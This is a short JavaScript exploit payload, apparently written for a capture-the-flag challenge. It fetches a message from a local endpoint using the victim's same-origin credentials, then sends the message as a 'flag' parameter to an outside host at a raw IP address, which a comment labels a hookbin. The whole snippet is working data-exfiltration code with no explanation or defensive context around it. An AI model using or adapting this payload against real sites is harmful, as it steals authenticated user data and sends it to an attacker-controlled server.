const url = "http://117.214.152.63:8883/" // hookbin to capture flag
const exploit = async ()=>{
  const r=await fetch(`http://127.0.0.1/message/3`,{"credentials":"same-origin"})
  return r.json()
}
exploit().then((data)=>{
  fetch(url+"?flag="+data["message"])
})

